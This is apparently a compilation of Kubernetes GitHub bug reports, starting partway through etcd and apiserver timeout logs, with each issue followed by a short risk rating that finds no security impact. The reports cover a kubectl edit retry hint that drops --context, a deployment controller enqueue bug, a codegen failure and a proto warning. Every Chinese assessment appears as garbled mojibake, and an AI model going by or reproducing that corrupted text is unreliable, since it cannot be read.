2024-11-15T16:08:32.012226796+08:00 stderr F I1115 08:08:32.012185      20 trace.go:205] Trace[1958868955]: "GuaranteedUpdate etcd3" audit-id:28031557-60b2-4f4f-ad50-aa00b6244ed5,key:/leases/gtm/cell.gtm.io,type:*coordination.Lease (15-Nov-2024 08:08:25.595) (total time: 6416ms):

2024-11-15T16:08:32.012513501+08:00 stderr F Trace[891349870]: ---"Txn call finished" err:rpc error: code = Unavailable desc = error reading from server: read tcp 10.255.69.15:45274->10.255.69.16:2379: read: connection timed out 9758ms (08:08:32.012)
2024-11-15T16:08:32.012513501+08:00 stderr F Trace[891349870]: [9.75949209s] [9.75949209s] END
2024-11-15T16:08:32.012513501+08:00 stderr F E1115 08:08:32.012404      20 status.go:71] apiserver received an error that is not an metav1.Status: &status.Error{s:(*status.Status)(0xc0bc1a7f98)}: rpc error: code = Unavailable desc = error reading from server: read tcp 10.255.69.15:45274->10.255.69.16:2379: read: connection timed out

2024-11-15T16:08:32.012736479+08:00 stderr F I1115 08:08:32.012514      20 trace.go:205] Trace[859168237]: "GuaranteedUpdate etcd3" audit-id:71717ed4-0c00-458a-8897-0d9df2388bfb,key:/leases/machine-config-operator/machine-config,type:*coordination.Lease (15-Nov-2024 08:08:23.523) (total time: 8489ms):
2024-11-15T16:08:32.012736479+08:00 stderr F Trace[859168237]: ---"Txn call finished" err:rpc error: code = Unavailable desc = error reading from server: read tcp 10.255.69.15:45274->10.255.69.16:2379: read: connection timed ou
t 8488ms (08:08:32.012)
2024-11-15T16:08:32.012736479+08:00 stderr F Trace[859168237]: [8.48927931s] [8.48927931s] END

0bd0e00/10.255.69.14:2379","attempt":0,"error":"rpc error: code = Unavailable desc = error reading from server: read tcp 10.255.69.15:45274->10.255.69.16:2379: read: connection timed out"}
2024-11-15T16:08:32.013502285+08:00 stderr F I1115 08:08:32.012231      20 trace.go:205] Trace[2108509803]: "GuaranteedUpdate etcd3" audit-id:3635e940-38e3-41ca-987a-926cc584384a,key:/leases/envoy-gateway-system/5b9825d2.gateway.envoyproxy.io,type:*coordination.Lease (15-Nov-2024 08:08:30.258) (total time: 1753ms):
2024-11-15T16:08:32.013502285+08:00 stderr F Trace[2108509803]: ---"Txn call finished" err:rpc error: code = Unavailable desc = error reading from server: read tcp 10.255.69.15:45274->10.255.69.16:2379: read: connection timed out 1752ms (08:08:32.012)
2024-11-15T16:08:32.013502285+08:00 stderr F Trace[2108509803]: [1.753630806s] [1.753630806s] END

2024-11-15T16:08:34.699497756+08:00 stderr F {"level":"warn","ts":"2024-11-15T08:08:34.699Z","logger":"etcd-client","caller":"v3/retry_interceptor.go:62","msg":"retrying of unary invoker failed","target":"etcd-endpoints://0xc00f16d880/10.255.69.14:2379","attempt":0,"error":"rpc error: code = Unavailable desc = error reading from server: read tcp 10.255.69.15:50918->10.255.69.16:2379: read: connection timed out"}
2024-11-15T16:08:34.699497756+08:00 stderr F {"level":"warn","ts":"2024-11-15T08:08:34.699Z","logger":"etcd-client","caller":"v3/retry_interceptor.go:62","msg":"retrying of unary invoker failed","target":"etcd-endpoints://0xc007d40000/10.255.69.14:2379","attempt":0,"error":"rpc error: code = Unavailable desc = error reading from server: read tcp 10.255.69.15:47940->10.255.69.16:2379: read: connection timed out"}

2024-11-15T16:08:35.070903277+08:00 stderr F {"level":"warn","ts":"2024-11-15T08:08:35.070Z","logger":"etcd-client","caller":"v3/retry_interceptor.go:62","msg":"retrying of unary invoker failed","target":"etcd-endpoints://0xc0a2a90700/10.255.69.14:2379","attempt":0,"error":"rpc error: code = Unavailable desc = keepalive ping failed to receive ACK within timeout"}
2024-11-15T16:08:35.082401449+08:00 stderr F W1115 08:08:35.082223      20 logging.go:59] [core] [Channel #254 SubChannel #257] grpc: addrConn.createTransport failed to connect to {
2024-11-15T16:08:35.082401449+08:00 stderr F   "Addr": "10.255.69.16:2379",
2024-11-15T16:08:35.082401449+08:00 stderr F   "ServerName": "10.255.69.16",
2024-11-15T16:08:35.082401449+08:00 stderr F   "Attributes": null,
2024-11-15T16:08:35.082401449+08:00 stderr F   "BalancerAttributes": null,
2024-11-15T16:08:35.082401449+08:00 stderr F   "Type": 0,
2024-11-15T16:08:35.082401449+08:00 stderr F   "Metadata": null
2024-11-15T16:08:35.082401449+08:00 stderr F }. Err: connection error: desc = "transport: Error while dialing dial tcp 10.255.69.16:2379: connect: connection timed out"
2024-11-15T16:08:35.082401449+08:00 stderr F W1115 08:08:35.082242      20 logging.go:59] [core] [Channel #977 SubChannel #980] grpc: addrConn.createTransport failed to connect to {
2024-11-15T16:08:35.082401449+08:00 stderr F   "Addr": "10.255.69.16:2379",
2024-11-15T16:08:35.082401449+08:00 stderr F   "ServerName": "10.255.69.16",
2024-11-15T16:08:35.082401449+08:00 stderr F   "Attributes": null,
2024-11-15T16:08:35.082401449+08:00 stderr F   "BalancerAttributes": null,
2024-11-15T16:08:35.082401449+08:00 stderr F   "Type": 0,
2024-11-15T16:08:35.082401449+08:00 stderr F   "Metadata": null
2024-11-15T16:08:35.082401449+08:00 stderr F }. Err: connection error: desc = "transport: Error while dialing dial tcp 10.255.69.16:2379: connect: connection timed out"

```

- The etcd logs show as follows:
```
etcd 

2024-11-15T16:00:03.089125997+08:00 stderr F {"level":"info","ts":"2024-11-15T08:00:03.088971Z","caller":"fileutil/purge.go:85","msg":"purged","path":"/var/lib/etcd/member/wal/00000000000014a6-0000000005fdfcae.wal"}
2024-11-15T16:01:04.261555789+08:00 stderr F {"level":"info","ts":"2024-11-15T08:01:04.261443Z","caller":"mvcc/index.go:214","msg":"compact tree index","revision":91749871}
2024-11-15T16:01:05.254012681+08:00 stderr F {"level":"info","ts":"2024-11-15T08:01:05.253911Z","caller":"mvcc/kvstore_compaction.go:66","msg":"finished scheduled compaction","compact-revision":91749871,"took":"966.045196ms","hash":576483144}
2024-11-15T16:01:05.254012681+08:00 stderr F {"level":"info","ts":"2024-11-15T08:01:05.253986Z","caller":"mvcc/hash.go:137","msg":"storing new hash","hash":576483144,"revision":91749871,"compact-revision":91733961}
2024-11-15T16:04:09.827516612+08:00 stderr F {"level":"info","ts":"2024-11-15T08:04:09.827399Z","caller":"wal/wal.go:785","msg":"created a new WAL segment","path":"/var/lib/etcd/member/wal/00000000000014ac-0000000005ff8643.wal"
}
2024-11-15T16:04:33.101219829+08:00 stderr F {"level":"info","ts":"2024-11-15T08:04:33.101107Z","caller":"fileutil/purge.go:85","msg":"purged","path":"/var/lib/etcd/member/wal/00000000000014a7-0000000005fe3968.wal"}
2024-11-15T16:06:04.278242322+08:00 stderr F {"level":"info","ts":"2024-11-15T08:06:04.278114Z","caller":"mvcc/index.go:214","msg":"compact tree index","revision":91765934}
2024-11-15T16:06:05.109317576+08:00 stderr F {"level":"info","ts":"2024-11-15T08:06:05.109193Z","caller":"mvcc/kvstore_compaction.go:66","msg":"finished scheduled compaction","compact-revision":91765934,"took":"803.717455ms","h
ash":163059895}
2024-11-15T16:06:05.109317576+08:00 stderr F {"level":"info","ts":"2024-11-15T08:06:05.109259Z","caller":"mvcc/hash.go:137","msg":"storing new hash","hash":163059895,"revision":91765934,"compact-revision":91749871}
2024-11-15T16:08:15.432491578+08:00 stderr F 2024/11/15 08:08:15 WARNING: [core] [Server #9] grpc: Server.processUnaryRPC failed to write status: connection error: desc = "transport is closing"
2024-11-15T16:08:28.472483552+08:00 stderr F {"level":"warn","ts":"2024-11-15T08:08:28.472346Z","caller":"rafthttp/probing_status.go:68","msg":"prober detected unhealthy status","round-tripper-name":"ROUND_TRIPPER_RAFT_MESSAGE","remote-peer-id":"f7585d3c6edd2214","rtt":"8.629741ms","error":"dial tcp 10.255.69.16:2380: i/o timeout"}
2024-11-15T16:08:33.472610748+08:00 stderr F {"level":"warn","ts":"2024-11-15T08:08:33.472502Z","caller":"rafthttp/probing_status.go:68","msg":"prober detected unhealthy status","round-tripper-name":"ROUND_TRIPPER_RAFT_MESSAGE","remote-peer-id":"f7585d3c6edd2214","rtt":"8.629741ms","error":"dial tcp 10.255.69.16:2380: i/o timeout"}
2024-11-15T16:08:38.473043376+08:00 stderr F {"level":"warn","ts":"2024-11-15T08:08:38.472799Z","caller":"rafthttp/probing_status.go:68","msg":"prober detected unhealthy status","round-tripper-name":"ROUND_TRIPPER_RAFT_MESSAGE","remote-peer-id":"f7585d3c6edd2214","rtt":"8.629741ms","error":"dial tcp 10.255.69.16:2380: i/o timeout"}
```

```
1. as we can see ,the 10.255.69.16 is unhealthy status at 15T08:08:28.472346Z

2. but the apiserver still try to connect to this unhealthy member  at 2024-11-15T16:08:32

```

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```
1.25.8
</details>


#### Cloud provider

<details>
no
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here
5.15.131
# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†åœ¨å…³é—­ä¸€ä¸ªåŒ…å«etcdé™æ€Podçš„masterèŠ‚ç‚¹åï¼Œkube-apiserverä»ç„¶å°è¯•è¿æ¥å·²ç»ä¸å¥åº·çš„etcdæˆå‘˜èŠ‚ç‚¹ã€‚è¿™æ˜¯å…³äºkube-apiserveråœ¨etcdèŠ‚ç‚¹å¤±æ•ˆåçš„è¿æ¥è¡Œä¸ºçš„é—®é¢˜ã€‚

æ ¹æ®æä¾›çš„ä¿¡æ¯ï¼Œè¿™æ˜¯ä¸€ä¸ªå¯ç”¨æ€§æˆ–ç¨³å®šæ€§çš„é—®é¢˜ï¼Œä½†å¹¶ä¸æ¶‰åŠå®‰å…¨é£é™©ã€‚å› ä¸ºè¦ä½¿etcdæˆå‘˜èŠ‚ç‚¹ä¸å¯ç”¨ï¼Œéœ€è¦å¯¹è¯¥èŠ‚ç‚¹å…·æœ‰ç®¡ç†å‘˜æƒé™æˆ–ç‰©ç†è®¿é—®æƒé™ï¼Œæ”»å‡»è€…æ— æ³•é€šè¿‡æ­¤æ–¹å¼è¿›è¡Œæ”»å‡»ã€‚æ­¤å¤–ï¼Œkube-apiserveræŒç»­å°è¯•è¿æ¥ä¸å¯ç”¨çš„etcdèŠ‚ç‚¹ï¼Œå¯èƒ½ä¼šå¯¼è‡´ä¸€å®šçš„å»¶è¿Ÿï¼Œä½†ä¸ä¼šå¯¼è‡´ä¸¥é‡çš„å®‰å…¨æ¼æ´ã€‚

å› æ­¤ï¼Œæ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼Œè¯¥Issueä¸æ¶‰åŠå®‰å…¨é£é™©ã€‚

---

## Issue #128808 kubectl edit: "You can run `kubectl replace -f FILE` to try this update again" misleading if user passed flags such as `--context`

- Issue é“¾æ¥ï¼š[#128808](https://github.com/kubernetes/kubernetes/issues/128808)

### Issue å†…å®¹

#### What happened?

I ran `kubectl --context=dev edit statefulset/kafka` and got a permissions error (my GKE user did not have appropriate permissions). I had used `--context=dev` to select a particular cluster.

After the permissions error, kubectl printed

```
You can run `kubectl replace -f /var/folders/5y/55wpzs4n79v91k_2jf35354w0000gp/T/kubectl-edit-10910983.yaml` to try this update again.
```

I fixed my permission error (by giving my GKE user appropriate permissions) and ran the command above, but I got this error:

```
Error from server (Conflict): error when replacing "/var/folders/5y/55wpzs4n79v91k_2jf35354w0000gp/T/kubectl-edit-10910983.yaml": Operation cannot be fulfilled on statefulsets.apps "kafka": StorageError: invalid object, Code: 4, Key: /registry/statefulsets/kafka-default/kafka, ResourceVersion: 0, AdditionalErrorMsg: Precondition failed: UID in precondition: 545e2602-484d-4c17-91ce-52bddf06e81e, UID in object meta: a280573a-fcd0-4771-a302-c48d1d47972f
```

That is because the original `edit` command I ran included `--context=dev` and the suggested "try again" command did not â€” I was sending this command to the wrong cluster!

#### What did you expect to happen?

Running the command printed by `kubectl edit` would run the same operation as my original operation, not talk to a different cluster.

Either:
- kubectl recognizes that relevant options like `--context` were passed by the user and includes them in the suggested command
- kubectl recognizes that relevant options like `--context` were passed by the user and decides not to suggest a command at all if it doesn't want to reproduce them
- kubectl includes more context from the original command in the file it writes and the command it suggests uses that full context
- The message printed could explicitly call out that you need to set things like context in the same way as the original command.

From my perspective, it's not particularly obvious that you *do* have to add `--context` yourself to the follow-up command but you *don't* have to add `--namespace`. I can reason it out based on having a somewhat sophisticated mental model of k8s/kubectl but telling people to run a write command that might talk to the wrong cluster seems like something to avoid!

#### How can we reproduce it (as minimally and precisely as possible)?

The issue is pretty clear from [the source](https://github.com/kubernetes/kubernetes/blob/475ee33f698334e5b00c58d3bef4083840ec12c5/staging/src/k8s.io/kubectl/pkg/cmd/util/editor/editoptions.go#L400C28-L400C83): the suggested command never includes extra flags like `--context`.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
Client Version: v1.29.3
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.29.9-gke.1496000```

</details>


#### Cloud provider

<details>
GKE
</details>


#### OS version

<details>

```console
Darwin Davids-MacBook-Pro.local 22.6.0 Darwin Kernel Version 22.6.0: Thu Sep  5 20:47:01 PDT 2024; root:xnu-8796.141.3.708.1~1/RELEASE_ARM64_T6000 arm64
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†åœ¨ä½¿ç”¨`kubectl edit`å‘½ä»¤æ—¶ï¼Œå¦‚æœç”¨æˆ·æŒ‡å®šäº†`--context`ç­‰å‚æ•°ï¼Œè€Œå‘½ä»¤æ‰§è¡Œå¤±è´¥åï¼Œkubectlç»™å‡ºçš„é‡è¯•å»ºè®®å‘½ä»¤ä¸­æœªåŒ…å«è¿™äº›å‚æ•°ï¼Œå¯èƒ½å¯¼è‡´ç”¨æˆ·åœ¨é”™è¯¯çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œå‘½ä»¤ï¼Œå½±å“åˆ°é”™è¯¯çš„é›†ç¾¤èµ„æºã€‚è¿™æ˜¯ä¸€ä¸ªç”¨æˆ·ä½“éªŒå’Œæ“ä½œä¾¿åˆ©æ€§çš„é—®é¢˜ï¼Œå¯èƒ½ä¼šå¯¼è‡´ç”¨æˆ·è¯¯æ“ä½œï¼Œä½†å¹¶ä¸æ¶‰åŠå®‰å…¨é£é™©ã€‚

æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼š
1. è¯¥é—®é¢˜ä¸ä¼šè¢«æ”»å‡»è€…åˆ©ç”¨ï¼Œå› ä¸ºæ”»å‡»è€…æ— æ³•æ§åˆ¶ç”¨æˆ·çš„å‘½ä»¤è¾“å…¥ï¼Œä¹Ÿæ— æ³•è¯±å¯¼ç”¨æˆ·æ‰§è¡Œé”™è¯¯çš„æ“ä½œã€‚
2. è¯¥é—®é¢˜ä¸ä¼šæˆä¸ºä¸€ä¸ªæ¼æ´ï¼Œä¸ç¬¦åˆåˆ†é…CVEç¼–å·çš„æ¡ä»¶ï¼Œä¸”æ ¹æ®CVSS 3.1è¯„åˆ†æ ‡å‡†ä¹Ÿä¸ä¼šè¾¾åˆ°highä»¥ä¸Šçš„è¯„çº§ã€‚
3. è¯¥é—®é¢˜å±äºç”¨æˆ·åœ¨æ“ä½œè¿‡ç¨‹ä¸­å¯èƒ½å‡ºç°çš„è¯¯æ“ä½œï¼Œå¹¶ä¸æ˜¯é¡¹ç›®æœ¬èº«çš„å®‰å…¨æ¼æ´ã€‚

ç»¼ä¸Šæ‰€è¿°ï¼Œè¯¥Issueä¸æ¶‰åŠå®‰å…¨é£é™©ã€‚

---

## Issue #128798 Deployment controller: Inconsistency of deletePod pod update handler and oldPodsRunning condition

- Issue é“¾æ¥ï¼š[#128798](https://github.com/kubernetes/kubernetes/issues/128798)

### Issue å†…å®¹

#### What happened?

We observed that in cluster with phase=Failed pods present, the update of the deployment using Recreate strategy was stalling for ~10 minutes (ProgressDeadlineSeconds period).

After a log analysis and code, I think this is caused by the fact that [deletePod handler](https://github.com/kubernetes/kubernetes/blob/74e84a90c725047b1328ff3d589fedb1cb7a120e/pkg/controller/deployment/deployment_controller.go#L385-L391) (the handler attached to pod informer), for Recreate case is enqueuing the deployment only if the number of pods equals zero. OTOH if the loop triggers, the different condition is checked: [oldPodsRunning](https://github.com/kubernetes/kubernetes/blob/74e84a90c725047b1328ff3d589fedb1cb7a120e/pkg/controller/deployment/recreate.go#L48-L51) ignores the terminal state pods such as Failed/Succeeded.

In effect, we may not enqueue deployment at the time when oldPodsRunning becomes true in a case when e.g. Succeeded pod is present.

#### What did you expect to happen?

That the deployment is enqueued at the time when oldPodsRunning becomes true -- the last pod is deleted.

#### How can we reproduce it (as minimally and precisely as possible)?

* Create a deployment with a pod in Failed state (we used a deployment with image that OOMs quite often)
* Try to update deployment few times
* You will observe that the updates starts to be delayed by ~10m at some point.

#### Anything else we need to know?

A proposed fix is to change the deletePod to exclude the Final/Succeed state or even better share the logic with the oldPodsRunning condition (maybe even call it from there).

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```
1.30.5, but the code looks like this also in master branch.
</details>


#### Cloud provider

<details>
gke
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†Kuberneteséƒ¨ç½²æ§åˆ¶å™¨ä¸­çš„ä¸€ä¸ªé€»è¾‘é—®é¢˜ï¼Œå½“å­˜åœ¨å¤„äºFailedæˆ–SucceededçŠ¶æ€çš„Podæ—¶ï¼Œä½¿ç”¨Recreateç­–ç•¥æ›´æ–°Deploymentå¯èƒ½ä¼šå› ä¸ºPodæœªè¢«æ­£ç¡®åœ°å…¥é˜Ÿï¼ˆenqueueï¼‰è€Œå¯¼è‡´æ›´æ–°å»¶è¿Ÿçº¦10åˆ†é’Ÿã€‚é—®é¢˜çš„æ ¹æºåœ¨äºdeletePodå¤„ç†ç¨‹åºå’ŒoldPodsRunningæ¡ä»¶ä¹‹é—´çš„é€»è¾‘ä¸ä¸€è‡´ã€‚

ä»å®‰å…¨è§’åº¦æ¥çœ‹ï¼Œè¿™ä¸ªé—®é¢˜å¯¼è‡´äº†Deploymentæ›´æ–°å»¶è¿Ÿï¼Œä½†å¹¶æœªæåŠä»»ä½•å¯è¢«æ”»å‡»è€…åˆ©ç”¨çš„å®‰å…¨æ¼æ´ã€‚æ”»å‡»è€…æ— æ³•é€šè¿‡æ­¤é—®é¢˜æå‡æƒé™ã€è¿›è¡Œå‘½ä»¤æ‰§è¡Œæˆ–å½±å“å…¶ä»–ç”¨æˆ·çš„èµ„æºã€‚æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼Œæ­¤Issueä¸æ¶‰åŠå®‰å…¨é£é™©ã€‚

---

## Issue #128775 When I'm running make update, I fail to run to Running update-codegen.

- Issue é“¾æ¥ï¼š[#128775](https://github.com/kubernetes/kubernetes/issues/128775)

### Issue å†…å®¹

#### What happened?

When I was running make update to Running update-codegen, an error occurred:
```Running in short-circuit mode; run with FORCE_ALL=true to force all scripts to run.
Running update-go-workspace
Running update-codegen
+++ [1113 10:34:29] Generating protobufs for 70 targets
+++ [1113 10:35:24] Generating deepcopy code for 267 targets
F1113 10:35:25.056042     508 main.go:107] Error: failed making a parser: error(s) in "./staging/src/k8s.io/code-generator/examples/HyphenGroup/apis/example/v1":
-: main module (k8s.io/code-generator) does not contain package k8s.io/code-generator/examples/HyphenGroup/apis/example/v1
error(s) in "./staging/src/k8s.io/code-generator/examples/MixedCase/apis/example/v1":
-: main module (k8s.io/code-generator) does not contain package k8s.io/code-generator/examples/MixedCase/apis/example/v1
error(s) in "./staging/src/k8s.io/code-generator/examples/apiserver/apis/core":
-: main module (k8s.io/code-generator) does not contain package k8s.io/code-generator/examples/apiserver/apis/core
error(s) in "./staging/src/k8s.io/code-generator/examples/apiserver/apis/core/v1":
-: main module (k8s.io/code-generator) does not contain package k8s.io/code-generator/examples/apiserver/apis/core/v1
error(s) in "./staging/src/k8s.io/code-generator/examples/apiserver/apis/example":
-: main module (k8s.io/code-generator) does not contain package k8s.io/code-generator/examples/apiserver/apis/example
error(s) in "./staging/src/k8s.io/code-generator/examples/apiserver/apis/example/v1":
-: main module (k8s.io/code-generator) does not contain package k8s.io/code-generator/examples/apiserver/apis/example/v1
error(s) in "./staging/src/k8s.io/code-generator/examples/apiserver/apis/example2":
-: main module (k8s.io/code-generator) does not contain package k8s.io/code-generator/examples/apiserver/apis/example2
error(s) in "./staging/src/k8s.io/code-generator/examples/apiserver/apis/example2/v1":
-: main module (k8s.io/code-generator) does not contain package k8s.io/code-generator/examples/apiserver/apis/example2/v1
error(s) in "./staging/src/k8s.io/code-generator/examples/apiserver/apis/example3.io":
-: main module (k8s.io/code-generator) does not contain package k8s.io/code-generator/examples/apiserver/apis/example3.io
error(s) in "./staging/src/k8s.io/code-generator/examples/apiserver/apis/example3.io/v1":
-: main module (k8s.io/code-generator) does not contain package k8s.io/code-generator/examples/apiserver/apis/example3.io/v1
error(s) in "./staging/src/k8s.io/code-generator/examples/crd/apis/example/v1":
-: main module (k8s.io/code-generator) does not contain package k8s.io/code-generator/examples/crd/apis/example/v1
error(s) in "./staging/src/k8s.io/code-generator/examples/crd/apis/example2/v1":
-: main module (k8s.io/code-generator) does not contain package k8s.io/code-generator/examples/crd/apis/example2/v1
error(s) in "./staging/src/k8s.io/code-generator/examples/single/api/v1":
-: main module (k8s.io/code-generator) does not contain package k8s.io/code-generator/examples/single/api/v1
!!! [1113 10:35:25] Call tree:
!!! [1113 10:35:25]  1: /root/***/code/kubernetes/hack/update-codegen.sh:885 codegen::deepcopy(...)
Running update-codegen FAILED 
```

#### What did you expect to happen?

make update succeed

#### How can we reproduce it (as minimally and precisely as possible)?

On the 1.31.1 branch code, run make update

#### Anything else we need to know?

my go env:
```
GO111MODULE='on'
GOARCH='amd64'
GOBIN=''
GOCACHE='/root/.cache/go-build'
GOENV='/root/.config/go/env'
GOEXE=''
GOEXPERIMENT=''
GOFLAGS=''
GOHOSTARCH='amd64'
GOHOSTOS='linux'
GOINSECURE=''
GOMODCACHE='/root/go/pkg/mod'
GONOPROXY='***.com'
GONOSUMDB='*'
GOOS='linux'
GOPATH='/root/go'
GOPRIVATE='***.com'
GOPROXY='http://***.com/goproxy/'
GOROOT='/opt/lsx/go'
GOSUMDB='sum.golang.org'
GOTMPDIR=''
GOTOOLCHAIN='auto'
GOTOOLDIR='/***/tool/linux_amd64'
GOVCS=''
GOVERSION='go1.22.1'
GCCGO='gccgo'
GOAMD64='v1'
AR='ar'
CC='gcc'
CXX='g++'
CGO_ENABLED='1'
GOMOD='/root/***/code/kubernetes/go.mod'
GOWORK='/root/***/code/kubernetes/go.work'
CGO_CFLAGS='-O2 -g'
CGO_CPPFLAGS=''
CGO_CXXFLAGS='-O2 -g'
CGO_FFLAGS='-O2 -g'
CGO_LDFLAGS='-O2 -g'
PKG_CONFIG='pkg-config'
```

#### Kubernetes version

<details>

```console
1.31.1
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
æ­¤Issueæè¿°äº†åœ¨ç¼–è¯‘Kubernetes 1.31.1åˆ†æ”¯ä»£ç æ—¶ï¼Œè¿è¡Œ`make update`å‘½ä»¤ï¼Œåœ¨æ‰§è¡Œ`update-codegen`æ­¥éª¤æ—¶å‘ç”Ÿäº†é”™è¯¯ã€‚é”™è¯¯ä¿¡æ¯æ˜¾ç¤ºä»£ç ç”Ÿæˆå™¨åœ¨å¤„ç†ä¸€äº›åŒ…æ—¶å¤±è´¥ï¼Œæç¤ºä¸»æ¨¡å—`k8s.io/code-generator`ä¸åŒ…å«æŸäº›ç¤ºä¾‹åŒ…ã€‚

æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼š

1. **è¯¥é£é™©èƒ½è¢«æ”»å‡»è€…åˆ©ç”¨**ï¼šæ­¤é—®é¢˜æ˜¯å¼€å‘è€…åœ¨æœ¬åœ°ç¯å¢ƒä¸­è¿è¡Œä»£ç ç”Ÿæˆå™¨æ—¶é‡åˆ°çš„ç¼–è¯‘é”™è¯¯ï¼Œæœªæ¶‰åŠä»»ä½•å¯è¢«æ”»å‡»è€…åˆ©ç”¨çš„å®‰å…¨æ¼æ´ã€‚

2. **è¯¥é£é™©æœ‰å¯èƒ½æˆä¸ºä¸€ä¸ªæ¼æ´ï¼Œå¹¶è¢«åˆ†é…CVEç¼–å·ï¼Œä½¿ç”¨CVSS 3.1è¯„åˆ†æ ‡å‡†æ‰“åˆ†ï¼Œç»“æœè¦åœ¨highä»¥ä¸Š**ï¼šæ­¤é—®é¢˜ä¸æ¶‰åŠä»»ä½•å·²çŸ¥çš„å®‰å…¨æ¼æ´ï¼Œä¹Ÿæœªæ¶‰åŠå¯èƒ½è·å¾—é«˜å±è¯„åˆ†çš„å®‰å…¨é£é™©ã€‚

3. **Issueæäº¤è€…åœ¨æäº¤å†…å®¹ä¸­æš´éœ²çš„æ•æ„Ÿä¿¡æ¯ã€ä¸å½“æ“ä½œã€ä¸å½“é…ç½®ç­‰é—®é¢˜ï¼Œä¸å±äºå®‰å…¨é£é™©**ï¼šä»æä¾›çš„ä¿¡æ¯æ¥çœ‹ï¼Œæœªæš´éœ²ä»»ä½•æ•æ„Ÿä¿¡æ¯ï¼Œé—®é¢˜æºäºå¼€å‘ç¯å¢ƒé…ç½®æˆ–ä¾èµ–é—®é¢˜ã€‚

å› æ­¤ï¼Œè¯¥Issueä¸æ¶‰åŠå®‰å…¨é£é™©ï¼Œå±äºä¸€èˆ¬çš„å¼€å‘ç¯å¢ƒé…ç½®æˆ–ä¾èµ–é—®é¢˜ã€‚

---

## Issue #128730 Kubelet reporting proto: duplicate proto type registered: v1beta1.Device for dra jobs

- Issue é“¾æ¥ï¼š[#128730](https://github.com/kubernetes/kubernetes/issues/128730)

### Issue å†…å®¹

#### What happened?

When Kubelet starts in the DRA test jobs, I am seeing the following log:

```
2024/11/10 12:51:40 proto: duplicate proto type registered: v1beta1.Device
```

#### What did you expect to happen?

No warning

#### How can we reproduce it (as minimally and precisely as possible)?

https://storage.googleapis.com/kubernetes-ci-logs/logs/ci-node-e2e-cgrpv2-crio-dra/1855587443407851520/artifacts/n1-standard-4-fedora-coreos-40-20241019-3-0-gcp-x86-64-5b2b14fa/kubelet.log



#### Anything else we need to know?

I don't know if this impacts anything but I noticed while debugging other issues.

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```
main
</details>


#### Cloud provider

<details>
NA
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥IssueæŠ¥å‘Šåœ¨å¯åŠ¨Kubeletæ—¶å‡ºç°äº†è­¦å‘Šæ—¥å¿—ï¼š`proto: duplicate proto type registered: v1beta1.Device`ã€‚è¿™è¡¨æ˜åœ¨æ³¨å†ŒProtobufç±»å‹æ—¶ï¼Œå­˜åœ¨é‡å¤æ³¨å†ŒåŒä¸€ç±»å‹çš„æƒ…å†µã€‚

ä»å®‰å…¨è§’åº¦åˆ†æï¼š

- **å¯è¢«æ”»å‡»è€…åˆ©ç”¨**ï¼šæ­¤è­¦å‘Šé€šå¸¸æ˜¯ç”±äºä»£ç ä¸­é‡å¤å¼•ç”¨æˆ–æ³¨å†Œäº†ç›¸åŒçš„Protobufç±»å‹å¯¼è‡´çš„ï¼Œå±äºè½¯ä»¶å®ç°é—®é¢˜ã€‚æ²¡æœ‰è¯æ®è¡¨æ˜æ”»å‡»è€…å¯ä»¥é€šè¿‡æ­¤è­¦å‘Šæ¥æ‰§è¡Œæ¶æ„æ“ä½œæˆ–åˆ©ç”¨è¯¥æ¼æ´ã€‚

